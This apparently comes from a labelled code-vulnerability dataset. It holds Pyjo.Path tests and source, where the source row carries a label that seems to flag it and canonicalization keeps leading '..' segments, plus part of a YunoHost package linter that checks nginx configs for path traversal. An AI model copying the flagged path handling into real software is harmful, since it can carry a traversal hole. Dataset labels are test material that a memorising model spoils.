    is_deeply_ok(path.parts, [], 'no parts')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    is_ok(str(path), '//', 'right normalized path')
    path = Pyjo.Path.new('%2F%2f')
    is_ok(str(path), '%2F%2f', 'right path')
    is_deeply_ok(path.parts, [], 'no parts')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    is_ok(str(path), '//', 'right normalized path')
    path = Pyjo.Path.new('/foo//bar/23/')
    is_ok(str(path), '/foo//bar/23/', 'right path')
    is_deeply_ok(path.parts, ['foo', '', 'bar', '23'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    path = Pyjo.Path.new('//foo/bar/23/')
    is_ok(str(path), '//foo/bar/23/', 'right path')
    is_deeply_ok(path.parts, ['', 'foo', 'bar', '23'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    path = Pyjo.Path.new('/foo///bar/23/')
    is_ok(str(path), '/foo///bar/23/', 'right path')
    is_deeply_ok(path.parts, ['foo', '', '', 'bar', '23'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    path = Pyjo.Path.new('///foo/bar/23/')
    is_ok(str(path), '///foo/bar/23/', 'right path')
    is_deeply_ok(path.parts, ['', '', 'foo', 'bar', '23'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    path = Pyjo.Path.new('///foo///bar/23///')
    is_ok(str(path), '///foo///bar/23///', 'right path')
    is_deeply_ok(path.parts, ['', '', 'foo', '', '', 'bar', '23', '', ''], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')

    # Escaped slash
    path = Pyjo.Path.new().set(parts=['foo/bar'])
    is_deeply_ok(path.parts, ['foo/bar'], 'right structure')
    is_ok(str(path), 'foo%2Fbar', 'right path')
    is_ok(str(path), 'foo%2Fbar', 'right path')
    is_ok(path.to_abs_str(), '/foo%2Fbar', 'right absolute path')
    is_ok(path.to_route(), '/foo/bar', 'right route')

    # Unchanged path
    path = Pyjo.Path.new('/foob%E4r/-._~!$&\'()*+,;=:@').set(charset='iso-8859-1')
    is_deeply_ok(path.clone().parts, [u""foob\xe4r"", '-._~!$&\'()*+,;=:@'], 'right structure')
    ok(path.contains(u""/foob\xe4r""), 'contains path')
    ok(path.contains(u""/foob\xe4r/-._~!$&'()*+,;=:@""), 'contains path')
    ok(not path.contains(u""/foob\xe4r/-._~!\$&'()*+,;=:.""), 'does not contain path')
    is_ok(str(path), '/foob%E4r/-._~!$&\'()*+,;=:@', 'right path')
    is_ok(path.to_abs_str(), '/foob%E4r/-._~!$&\'()*+,;=:@', 'right absolute path')
    is_ok(path.to_route(), u""/foob\xe4r/-._~!$&'()*+,;=:@"", 'right route')
    is_ok(str(path.clone()), '/foob%E4r/-._~!$&\'()*+,;=:@', 'right path')
    is_ok(path.clone().to_abs_str(), '/foob%E4r/-._~!$&\'()*+,;=:@', 'right absolute path')
    is_ok(path.clone().to_route(), u""/foob\xe4r/-._~!$&'()*+,;=:@"", 'right route')

    # Reuse path
    path = Pyjo.Path.new('/foob%E4r').set(charset='iso-8859-1')
    is_ok(str(path), '/foob%E4r', 'right path')
    is_deeply_ok(path.parts, [u""foob\xe4r""], 'right structure')
    path.parse('/foob%E4r')
    is_ok(str(path), '/foob%E4r', 'right path')
    is_deeply_ok(path.parts, [u""foob\xe4r""], 'right structure')

    # Latin-1
    path = Pyjo.Path.new().set(charset='iso-8859-1').parse('/foob%E4r')
    is_deeply_ok(path.parts, [u'foobär'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(str(path), '/foob%E4r', 'right path')
    is_ok(str(path), '/foob%E4r', 'right path')
    is_ok(path.to_abs_str(), '/foob%E4r', 'right absolute path')
    is_ok(path.to_route(), u'/foobär', 'right route')
    is_ok(str(path.clone()), '/foob%E4r', 'right path')

    # No charset
    path = Pyjo.Path.new().set(charset=None).parse(b'/%E4')
    is_deeply_ok(path.parts, [b""\xe4""], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(str(path), '/%E4', 'right path')
    is_ok(path.to_route(), b""/\xe4"", 'right route')
    is_ok(str(path.clone()), '/%E4', 'right path')

    done_testing()
/n/n/nt/docs/Path.py/n/n# -*- coding: utf-8 -*-

import Pyjo.Test


class NoseTest(Pyjo.Test.NoseTest):
    script = __file__
    srcdir = '../..'


class UnitTest(Pyjo.Test.UnitTest):
    script = __file__


if __name__ == '__main__':

    from Pyjo.Test import *  # @UnusedWildImport

    import Pyjo.Path
    from Pyjo.TextStream import u

    # __init __
    path = Pyjo.Path.new()
    is_ok(str(path), '', ""path"")
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    is_ok(str(path), '/foo%2Fbar%3B/baz.html', ""path"")

    # charset
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    charset = path.charset
    is_ok(charset, 'utf-8', ""charset"")
    path.charset = 'utf-8'
    charset = path.charset
    is_ok(charset, 'utf-8', ""charset"")

    # __iter__
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    l = [v for v in path]
    is_deeply_ok(l, [u'foo', u'bar;', u'baz.html'], ""[v for v in path]"")

    # __bool__
    ok(Pyjo.Path.new(), ""Pyjo.Path.new()"")

    # canonicalize
    path = Pyjo.Path.new('/foo/./bar/../baz').canonicalize()
    is_ok(str(path), ""/foo/baz"", ""path"")

    path = Pyjo.Path.new('/foo/../bar/../../baz').canonicalize()
    is_ok(str(path), ""/../baz"", ""path"")

    path = Pyjo.Path.new('/foo/.../bar').canonicalize()
    is_ok(str(path), ""/foo/bar"", ""path"")

    # clone
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    path2 = path.clone()
    is_ok(str(path2), '/foo%2Fbar%3B/baz.html', 'path2')
    isnt_ok(id(path), id(path2), 'path')

    # contains
    boolean = Pyjo.Path.new('/foo/bar').contains('/')
    is_ok(boolean, True, ""boolean"")
    boolean = Pyjo.Path.new('/foo/bar').contains('/foo')
    is_ok(boolean, True, ""boolean"")
    boolean = Pyjo.Path.new('/foo/bar').contains('/foo/bar')
    is_ok(boolean, True, ""boolean"")

    boolean = Pyjo.Path.new('/foo/bar').contains('/f')
    is_ok(boolean, False, ""boolean"")
    boolean = Pyjo.Path.new('/foo/bar').contains('/bar')
    is_ok(boolean, False, ""boolean"")
    boolean = Pyjo.Path.new('/foo/bar').contains('/whatever')
    is_ok(boolean, False, ""boolean"")

    # leading_slash
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    leading_slash = path.leading_slash
    is_ok(leading_slash, True, ""leading_slash"")
    path.leading_slash = False
    leading_slash = path.leading_slash
    is_ok(leading_slash, False, ""leading_slash"")

    # merge
    path = Pyjo.Path.new('/foo/bar').merge('/baz/yada')
    is_ok(str(path), ""/baz/yada"", ""path"")

    path = Pyjo.Path.new('/foo/bar').merge('baz/yada')
    is_ok(str(path), ""/foo/baz/yada"", ""path"")

    path = Pyjo.Path.new('/foo/bar/').merge('baz/yada')
    is_ok(str(path), ""/foo/bar/baz/yada"", ""path"")

    # parse
    path = Pyjo.Path.new()
    path = path.parse('/foo%2Fbar%3B/baz.html')
    is_deeply_ok(path.parts, [u'foo', u'bar;', u'baz.html'], ""path.parts"")

    # paths
    path = Pyjo.Path.new()
    path.parts = ['foo', 'bar', 'baz']
    is_ok(str(path), 'foo/bar/baz', 'path')

    path.parts.append('foo/bar')
    is_ok(str(path), 'foo/bar/baz/foo%2Fbar', 'path')

    # to_abs_str
    path = Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_abs_str()
    is_ok(str(path), ""/i/%E2%99%A5/pyjo"", ""path"")

    path = Pyjo.Path.new('i/%E2%99%A5/pyjo').to_abs_str()
    is_ok(str(path), ""/i/%E2%99%A5/pyjo"", ""path"")

    # to_bytes
    path = Pyjo.Path.new('/i/%E2%99%A5/pyjo')
    is_ok(bytes(path), b""/i/%E2%99%A5/pyjo"", ""path"")

    path = Pyjo.Path.new('i/%E2%99%A5/pyjo')
    is_ok(bytes(path), b""i/%E2%99%A5/pyjo"", ""path"")

    # to_dir
    path = Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_dir()
    is_ok(str(path), ""/i/%E2%99%A5/"", ""path"")

    path = Pyjo.Path.new('i/%E2%99%A5/pyjo').to_dir()
    is_ok(str(path), ""i/%E2%99%A5/"", ""path"")

    # to_route
    path = Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_route()
    is_ok(u(path), u""/i/♥/pyjo"", ""path"")

    path = Pyjo.Path.new('i/%E2%99%A5/pyjo').to_route()
    is_ok(u(path), u""/i/♥/pyjo"", ""path"")

    # to_str
    path = Pyjo.Path.new('/i/%E2%99%A5/pyjo')
    is_ok(str(path), ""/i/%E2%99%A5/pyjo"", ""path"")

    path = Pyjo.Path.new('i/%E2%99%A5/pyjo')
    is_ok(str(path), ""i/%E2%99%A5/pyjo"", ""path"")

    # trailing_slash
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    trailing_slash = path.trailing_slash
    is_ok(trailing_slash, False, ""trailing_slash"")
    path.trailing_slash = True
    trailing_slash = path.trailing_slash
    is_ok(trailing_slash, True, ""trailing_slash"")

    done_testing()
/n/n/n",0
137,e4b115bc80c41615b2133091af3a74ee5d995c2e,"/Pyjo/Path.py/n/n# -*- coding: utf-8 -*-

""""""
Pyjo.Path - Path
================
::

    import Pyjo.Path

    # Parse
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    print(path[0])

    # Build
    path = Pyjo.Path.new(u'/i/♥')
    path.append('pyjo')
    print(path)

:mod:`Pyjo.Path` is a container for paths used by :mod:`Pyjo.URL` and based on
:rfc:`3986`.
""""""

import Pyjo.Base
import Pyjo.Mixin.String

from Pyjo.Util import b, u, url_escape, url_unescape


class Pyjo_Path(Pyjo.Base.object, Pyjo.Mixin.String.object):
    """"""::

        path = Pyjo.Path.new()
        path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')

    Construct a new :mod`Pyjo.Path` object and :meth:`parse` path if necessary.
    """"""

    charset = 'utf-8'
    """"""::

        charset = path.charset
        path.charset = 'utf-8'

    Charset used for encoding and decoding, defaults to ``utf-8``. ::

        # Disable encoding and decoding
        path.charset = None
    """"""

    _leading_slash = False
    _path = None
    _parts = None
    _trailing_slash = False

    def __init__(self, path=None):
        super(Pyjo_Path, self).__init__()
        if path is not None:
            self.parse(path)

    def __bool__(self):
        """"""::

            boolean = bool(path)

        Always true. (Python 3.x)
        """"""
        return True

    def __bytes__(self):
        """"""::

            bstring = bytes(path)

        Byte-string representation of an object. (Python 3.x)
        """"""
        return self.to_bytes()

    def __iter__(self):
        """"""::

            parts = list(path)

        Iterator based on :attr:`parts`. Note that this will normalize the path and that ``%2F``
        will be treated as ``/`` for security reasons.
        """"""
        return iter(self.parts)

    def __nonzero__(self):
        """"""::

            boolean = bool(path)

        Always true. (Python 2.x)
        """"""
        return True

    def canonicalize(self):
        """"""::

            path = path.canonicalize()

        Canonicalize path. ::

            # ""/foo/baz""
            Pyjo.Path.new('/foo/./bar/../baz').canonicalize()

            # ""/../baz""
            Pyjo.Path.new('/foo/../bar/../../baz').canonicalize()
        """"""
        parts = self.parts
        i = 0
        while i < len(parts):
            if parts[i] == '.' or parts[i] == '':
                parts.pop(i)
            elif i < 1 or parts[i] != '..' or parts[i - 1] == '..':
                i += 1
            else:
                i -= 1
                parts.pop(i)
                parts.pop(i)

        if not parts:
            self.trailing_slash = False

        return self

    def clone(self):
        """"""::

            clone = path.clone()

        Clone path.
        """"""
        new_obj = type(self)()
        new_obj.charset = self.charset
        if self._parts:
            new_obj._parts = list(self._parts)
            new_obj._leading_slash = self._leading_slash
            new_obj._trailing_slash = self._trailing_slash
        else:
            new_obj._path = self._path
        return new_obj

    def contains(self, prefix):
        """"""::

            boolean = path.contains(u'/i/♥/pyjo')

        Check if path contains given prefix. ::

            # True
            Pyjo.Path.new('/foo/bar').contains('/')
            Pyjo.Path.new('/foo/bar').contains('/foo')
            Pyjo.Path.new('/foo/bar').contains('/foo/bar')

            # False
            Pyjo.Path.new('/foo/bar').contains('/f')
            Pyjo.Path.new('/foo/bar').contains('/bar')
            Pyjo.Path.new('/foo/bar').contains('/whatever')
        """"""
        if prefix == '/':
            return True
        else:
            path = self.to_route()
            return len(path) >= len(prefix) \
                and path.startswith(prefix) \
                and (len(path) == len(prefix) or path[len(prefix)] == '/')

    @property
    def leading_slash(self):
        """"""::

            boolean = path.leading_slash
            path.leading_slash = boolean

        Path has a leading slash. Note that this method will normalize the path and
        that ``%2F`` will be treated as ``/`` for security reasons.
        """"""
        return self._parse('leading_slash')

    @leading_slash.setter
    def leading_slash(self, value):
        self._parse('leading_slash', value)

    def merge(self, path):
        """"""::

            path = path.merge('/foo/bar')
            path = path.merge('foo/bar')
            path = path.merge(Pyjo.Path.new('foo/bar'))

        Merge paths. Note that this method will normalize both paths if necessary and
        that ``%2F`` will be treated as ``/`` for security reasons. ::

            # ""/baz/yada""
            Pyjo.Path.new('/foo/bar').merge('/baz/yada')

            # ""/foo/baz/yada""
            Pyjo.Path.new('/foo/bar').merge('baz/yada')

            # ""/foo/bar/baz/yada""
            Pyjo.Path.new('/foo/bar/').merge('baz/yada')
        """"""
        # Replace
        if u(path).startswith('/'):
            return self.parse(path)

        # Merge
        if not self.trailing_slash and self.parts:
            self.parts.pop()

        path = self.new(path)
        self.parts += path.parts

        self._trailing_slash = path._trailing_slash

        return self

    def parse(self, path):
        """"""::

            path = path.parse('/foo%2Fbar%3B/baz.html')

        Parse path.
        """"""
        self._path = b(path, self.charset)

        self._parts = None
        self._leading_slash = False
        self._trailing_slash = False

        return self

    @property
    def parts(self):
        """"""::

            parts = path.parts
            path.parts = ['foo', 'bar', 'baz']

        The path parts. Note that this method will normalize the path and that ``%2F``
        will be treated as ``/`` for security reasons. ::

            # Part with slash
            path.parts.append('foo/bar')
        """"""
        return self._parse('parts')

    @parts.setter
    def parts(self, value):
        self._parse('parts', value)

    def to_abs_str(self):
        """"""::

            str = path.to_abs_str()

        Turn path into an absolute string. ::

            # ""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_abs_str()
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_abs_str()
        """"""
        path = self.to_str()
        if not path.startswith('/'):
            path = '/' + path
        return path

    def to_bytes(self):
        """"""::

            bstring = path.to_bytes()

        Turn path into a bytes string. ::

            # b""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_bytes()

            # b""i/%E2%99%A5/pyjo""
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_bytes()
        """"""
        # Path
        charset = self.charset

        if self._path is not None:
            return url_escape(self._path, br'^A-Za-z0-9\-._~!$&\'()*+,;=%:@/')

        if self._parts:
            parts = self._parts
            if charset:
                parts = map(lambda p: p.encode(charset), parts)
            path = b'/'.join(map(lambda p: url_escape(p, br'^A-Za-z0-9\-._~!$&\'()*+,;=:@'), parts))
        else:
            path = b''

        if self._leading_slash:
            path = b'/' + path

        if self._trailing_slash:
            path = path + b'/'

        return path

    def to_dir(self):
        """"""::

            dir = route.to_dir()

        Clone path and remove everything after the right-most slash. ::

            # ""/i/%E2%99%A5/""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_dir()

            # ""i/%E2%99%A5/""
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_dir()
        """"""
        clone = self.clone()
        if not clone.trailing_slash:
            clone.parts.pop()
        clone.trailing_slash = bool(clone.parts)
        return clone

    def to_json(self):
        """"""::

            string = path.to_json()

        Turn path into a JSON representation. The same as :meth:`to_str`. ::

            # ""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_json()
        """"""
        return self.to_str()

    def to_route(self):
        """"""::

            route = path.to_route()

        Turn path into a route. ::

            # ""/i/♥/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_route()
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_route()
        """"""
        clone = self.clone()
        if clone.charset is None:
            slash = b'/'
        else:
            slash = '/'
        route = slash + slash.join(clone.parts)
        if clone._trailing_slash:
            route += slash
        return route

    def to_str(self):
        """"""::

            string = path.to_str()

        Turn path into a string. ::

            # ""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_str()

            # ""i/%E2%99%A5/pyjo""
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_str()
        """"""
        return self.to_bytes().decode('ascii')

    @property
    def trailing_slash(self):
        """"""::

            boolean = path.trailing_slash
            path.trailing_slash = boolean

        Path has a trailing slash. Note that this method will normalize the path and
        that ``%2F`` will be treated as ``/`` for security reasons.
        """"""
        return self._parse('trailing_slash')

    @trailing_slash.setter
    def trailing_slash(self, value):
        self._parse('trailing_slash', value)

    def _parse(self, name, *args):
        if self._parts is None:
            charset = self.charset

            if self._path is not None:
                path = self._path
            else:
                path = u'' if charset else b''

            if charset:
                path = url_unescape(b(path, charset)).decode(charset)
                slash = u'/'
            else:
                path = url_unescape(path)
                slash = b'/'

            self._path = None

            if path.startswith(slash):
                path = path[1:]
                self._leading_slash = True

            if path.endswith(slash):
                path = path[:-1]
                self._trailing_slash = True

            if path == '':
                self._parts = []
            else:
                self._parts = path.split(slash)

        if not args:
            return getattr(self, '_' + name)

        setattr(self, '_' + name, args[0])


new = Pyjo_Path.new
object = Pyjo_Path  # @ReservedAssignment
/n/n/n",1
138,f6e98894cfe841aedaa7efd590937f0255193913,"package_linter.py/n/n#!/usr/bin/env python3
# -*- coding: utf8 -*-

import sys
import os
import re
import json
import shlex
import urllib.request
import codecs

reader = codecs.getreader(""utf-8"")
return_code = 0


# ############################################################################
#   Utilities
# ############################################################################


class c:
    HEADER = '\033[94m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    MAYBE_FAIL = '\033[96m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def header(app):
    print(""""""
    [{header}{bold}YunoHost App Package Linter{end}]

 App packaging documentation - https://yunohost.org/#/packaging_apps
 App package example         - https://github.com/YunoHost/example_ynh
 Official helpers            - https://yunohost.org/#/packaging_apps_helpers_en
 Experimental helpers        - https://github.com/YunoHost-Apps/Experimental_helpers

    Analyzing package {header}{app}{end}""""""
    .format(header=c.HEADER, bold=c.BOLD, end=c.END, app=app))


def print_header(str):
    print(""\n ["" + c.BOLD + c.HEADER + str.title() + c.END + ""]\n"")


def print_right(str):
    print(c.OKGREEN + ""✔"", str, c.END)


def print_warning(str):
    print(c.WARNING + ""!"", str, c.END)


def print_error(str, reliable=True):
    if reliable:
        global return_code
        return_code = 1
        print(c.FAIL + ""✘"", str, c.END)
    else:
        print(c.MAYBE_FAIL + ""?"", str, c.END)


def urlopen(url):
    try:
        conn = urllib.request.urlopen(url)
    except urllib.error.HTTPError as e:
        return {'content': '', 'code': e.code}
    except urllib.error.URLError as e:
        print('URLError')
    return {'content': conn.read().decode('UTF8'), 'code': 200}


def file_exists(file_path):
    return os.path.isfile(file_path) and os.stat(file_path).st_size > 0


# ############################################################################
#   Actual high-level checks
# ############################################################################

class App():

    def __init__(self, path):

        print_header(""LOADING APP"")
        self.path = path

        scripts = [""install"", ""remove"", ""upgrade"", ""backup"", ""restore""]
        self.scripts = {f: Script(self.path, f) for f in scripts}

    def analyze(self):

        self.misc_file_checks()
        self.check_helper_consistency()
        self.check_source_management()
        self.check_manifest()

        for script in self.scripts.values():
            if script.exists:
                script.analyze()

    def misc_file_checks(self):

        print_header(""MISC FILE CHECKS"")

        #
        # Check for recommended and mandatory files
        #

        filenames = (""manifest.json"", ""LICENSE"", ""README.md"",
                     ""scripts/install"", ""scripts/remove"",
                     ""scripts/upgrade"",
                     ""scripts/backup"", ""scripts/restore"")
        non_mandatory = (""script/backup"", ""script/restore"")

        for filename in filenames:
            if file_exists(self.path + ""/"" + filename):
                continue
            elif filename in non_mandatory:
                print_warning(""Consider adding a file %s"" % filename)
            else:
                print_error(""File %s is mandatory"" % filename)

        #
        # Deprecated php-fpm.ini thing
        #

        if file_exists(self.path + ""/conf/php-fpm.ini""):
            print_warning(
                ""Using a separate php-fpm.ini file is deprecated. ""
                ""Please merge your php-fpm directives directly in the pool file. ""
                ""(c.f. https://github.com/YunoHost-Apps/nextcloud_ynh/issues/138 )""
            )

        #
        # Analyze nginx conf
        # - Deprecated usage of 'add_header' in nginx conf
        # - Spot path traversal issue vulnerability
        #

        for filename in os.listdir(self.path + ""/conf""):
            # Ignore subdirs or filename not containing nginx in the name
            if not os.path.isfile(self.path + ""/conf/"" + filename) or ""nginx"" not in filename:
                continue

            #
            # 'add_header' usage
            #
            content = open(self.path + ""/conf/"" + filename).read()
            if ""location"" in content and ""add_header"" in content:
                print_warning(
                    ""Do not use 'add_header' in the nginx conf. Use 'more_set_headers' instead. ""
                    ""(See https://www.peterbe.com/plog/be-very-careful-with-your-add_header-in-nginx ""
                    ""and https://github.com/openresty/headers-more-nginx-module#more_set_headers )""
                )

            #
            # Path traversal issues
            #
            lines = open(self.path + ""/conf/"" + filename).readlines()
            lines = [line.strip() for line in lines if not line.strip().startswith(""#"")]
            # Let's find the first location line
            location_line = None
            path_traversal_vulnerable = False
            lines_iter = lines.__iter__()
            for line in lines_iter:
                if line.startswith(""location""):
                    location_line = line
                    break
            # Look at the next lines for an 'alias' directive
            if location_line is not None:
                for line in lines_iter:
                    if line.startswith(""location""):
                        # Entering a new location block ... abort here
                        # and assume there's no alias block later...
                        break
                    if line.startswith(""alias""):
                        # We should definitely check for path traversal issue
                        # Does the location target ends with / ?
                        target = location_line.split()[-2]
                        if not target.endswith(""/""):
                            path_traversal_vulnerable = True
                        break
            if path_traversal_vulnerable:
                print_warning(
                    ""The nginx configuration appears vulnerable to path traversal as explained in ""
                    ""https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/\n""
                    ""To fix it, look at the first lines of the nginx conf of the example app : ""
                    ""https://github.com/YunoHost/example_ynh/blob/master/conf/nginx.conf""
                )

    def check_helper_consistency(self):
        """"""
        check if ynh_install_app_dependencies is present in install/upgrade/restore
        so dependencies are up to date after restoration or upgrade
        """"""

        install_script = self.scripts[""install""]
        if install_script.exists:
            if install_script.contains(""ynh_install_app_dependencies""):
                for name in [""upgrade"", ""restore""]:
                    if self.scripts[name].exists and not self.scripts[name].contains(""ynh_install_app_dependencies""):
                        print_warning(""ynh_install_app_dependencies should also be in %s script"" % name)

            if install_script.contains(""yunohost service add""):
                if self.scripts[""remove""].exists and not self.scripts[""remove""].contains(""yunohost service remove""):
                    print_error(
                        ""You used 'yunohost service add' in the install script, ""
                        ""but not 'yunohost service remove' in the remove script.""
                    )

    def check_source_management(self):
        print_header(""SOURCES MANAGEMENT"")
        DIR = os.path.join(self.path, ""sources"")
        # Check if there is more than six files on 'sources' folder
        if os.path.exists(os.path.join(self.path, ""sources"")) \
           and len([name for name in os.listdir(DIR) if os.path.isfile(os.path.join(DIR, name))]) > 5:
            print_warning(
                ""[YEP-3.3] Upstream app sources shouldn't be stored in this 'sources' folder of this git repository as a copy/paste\n""
                ""During installation, the package should download sources from upstream via 'ynh_setup_source'.\n""
                ""See the helper documentation. ""
                ""Original discussion happened here : ""
                ""https://github.com/YunoHost/issues/issues/201#issuecomment-391549262""
            )

    def check_manifest(self):
        manifest = os.path.join(self.path, 'manifest.json')
        if not os.path.exists(manifest):
            return
        print_header(""MANIFEST"")
        """"""
        Check if there is no comma syntax issue
        """"""

        try:
            with open(manifest, encoding='utf-8') as data_file:
                manifest = json.loads(data_file.read())
        except:
            print_error(""[YEP-2.1] Syntax (comma) or encoding issue with manifest.json. Can't check file."")

        fields = (""name"", ""id"", ""packaging_format"", ""description"", ""url"", ""version"",
                  ""license"", ""maintainer"", ""requirements"", ""multi_instance"",
                  ""services"", ""arguments"")

        for field in fields:
            if field not in manifest:
                print_warning(""[YEP-2.1] \"""" + field + ""\"" field is missing"")

        """"""
        Check values in keys
        """"""

        if ""packaging_format"" not in manifest:
            print_error(""[YEP-2.1] \""packaging_format\"" key is missing"")
        elif not isinstance(manifest[""packaging_format""], int):
            print_error(""[YEP-2.1] \""packaging_format\"": value isn't an integer type"")
        elif manifest[""packaging_format""] != 1:
            print_error(""[YEP-2.1] \""packaging_format\"" field: current format value is '1'"")

        # YEP 1.1 Name is app
        if ""id"" in manifest:
            if not re.match('^[a-z1-9]((_|-)?[a-z1-9])+$', manifest[""id""]):
                print_error(""[YEP-1.1] 'id' field '%s' should respect this regex '^[a-z1-9]((_|-)?[a-z1-9])+$'"")

        if ""name"" in manifest:
            if len(manifest[""name""]) > 22:
                print_warning(
                    ""[YEP-1.1] The 'name' field shouldn't be too long to be able to be with one line in the app list. ""
                    ""The most current bigger name is actually compound of 22 characters.""
                )

        # YEP 1.2 Put the app in a weel known repo
        if ""id"" in manifest:
            official_list_url = ""https://raw.githubusercontent.com/YunoHost/apps/master/official.json""
            official_list = json.loads(urlopen(official_list_url)['content'])
            community_list_url = ""https://raw.githubusercontent.com/YunoHost/apps/master/community.json""
            community_list = json.loads(urlopen(community_list_url)['content'])
            if manifest[""id""] not in official_list and manifest[""id""] not in community_list:
                print_warning(""[YEP-1.2] This app is not registered in official or community applications"")

        # YEP 1.3 License
        def license_mentionned_in_readme(path):
            readme_path = os.path.join(path, 'README.md')
            if os.path.isfile(readme_path):
                return ""LICENSE"" in open(readme_path).read()
            return False

        if ""license"" in manifest:
            for license in manifest['license'].replace('&', ',').split(','):
                code_license = '<code property=""spdx:licenseId"">' + license + '</code>'
                link = ""https://spdx.org/licenses/""
                if license == ""nonfree"":
                    print_warning(""[YEP-1.3] The correct value for non free license in license field is 'non-free' and not 'nonfree'"")
                    license = ""non-free""
                if license in [""free"", ""non-free"", ""dep-non-free""]:
                    if not license_mentionned_in_readme(self.path):
                        print_warning(
                            ""[YEP-1.3] The use of '%s' in license field implies ""
                            "" to write something about the license in your README.md"" % (license)
                        )
                    if license in [""non-free"", ""dep-non-free""]:
                        print_warning(
                            ""[YEP-1.3] 'non-free' apps can't be officialized. ""
                            "" Their integration is still being discussed, especially for apps with non-free dependencies""
                        )
                elif code_license not in urlopen(link)['content']:
                    print_warning(
                        ""[YEP-1.3] The license '%s' is not registered in https://spdx.org/licenses/ . ""
                        ""It can be a typo error. If not, you should replace it by 'free' ""
                        ""or 'non-free' and give some explanations in the README.md."" % (license)
                    )

        # YEP 1.4 Inform if we continue to maintain the app
        # YEP 1.5 Update regularly the app status
        # YEP 1.6 Check regularly the evolution of the upstream

        # YEP 1.7 - Add an app to the YunoHost-Apps organization
        if ""id"" in manifest:
            repo = ""https://github.com/YunoHost-Apps/%s_ynh"" % (manifest[""id""])
            is_not_added_to_org =  urlopen(repo)['code'] == 404

            if is_not_added_to_org:
                print_warning(""[YEP-1.7] You should add your app in the YunoHost-Apps organisation."")

        # YEP 1.8 Publish test request
        # YEP 1.9 Document app
        if ""description"" in manifest:
            descr = manifest[""description""]
            if isinstance(descr, dict):
                descr = descr.get(""en"", None)

            if descr is None or descr == manifest.get(""name"", None):
                print_warning(
                    ""[YEP-1.9] You should write a good description of the app, ""
                    ""at least in english (1 line is enough).""
                )

            elif ""for yunohost"" in descr.lower():
                print_warning(
                    ""[YEP-1.9] The 'description' should explain what the app actually does. ""
                    ""No need to say that it is 'for YunoHost' - this is a YunoHost app ""
                    ""so of course we know it is for YunoHost ;-).""
                )

        # TODO test a specific template in README.md

        # YEP 1.10 Garder un historique de version propre

        # YEP 1.11 Cancelled

        # YEP 2.1
        if ""multi_instance"" in manifest and manifest[""multi_instance""] != 1 and manifest[""multi_instance""] != 0:
            print_error(
                ""[YEP-2.1] \""multi_instance\"" field must be boolean type values 'true' or 'false' and not string type"")

        if ""services"" in manifest:
            services = (""nginx"", ""mysql"", ""uwsgi"", ""metronome"",
                        ""php5-fpm"", ""php7.0-fpm"", ""php-fpm"",
                        ""postfix"", ""dovecot"", ""rspamd"")

            for service in manifest[""services""]:
                if service not in services:
                    # FIXME : wtf is it supposed to mean ...
                    print_warning(""[YEP-2.1] "" + service + "" service may not exist"")

        if ""install"" in manifest[""arguments""]:

            recognized_types = (""domain"", ""path"", ""boolean"", ""app"", ""password"", ""user"", ""string"")

            for argument in manifest[""arguments""][""install""]:
                if ""type"" not in argument.keys():
                    print_warning(
                        ""[YEP-2.1] You should specify the type of the argument '%s'. ""
                        ""You can use : %s."" % (argument[""name""], ', '.join(recognized_types))
                    )
                elif argument[""type""] not in recognized_types:
                    print_warning(
                        ""[YEP-2.1] The type '%s' for argument '%s' is not recognized... ""
                        ""it probably doesn't behave as you expect ? Choose among those instead : %s"" % (argument[""type""], argument[""name""], ', '.join(recognized_types))
                    )

                if ""choices"" in argument.keys():
                    choices = [c.lower() for c in argument[""choices""]]
                    if len(choices) == 2:
                        if (""true"" in choices and ""false"" in choices) or (""yes"" in choices and ""no"" in choices):
                            print_warning(
                                ""Argument %s : you might want to simply use a boolean-type argument. ""
                                ""No need to specify the choices list yourself."" % argument[""name""]
                            )

        if ""url"" in manifest and manifest[""url""].endswith(""_ynh""):
            print_warning(
                ""'url' is not meant to be the url of the yunohost package, ""
                ""but rather the website or repo of the upstream app itself...""
            )


class Script():

    def __init__(self, app_path, name):
        self.name = name
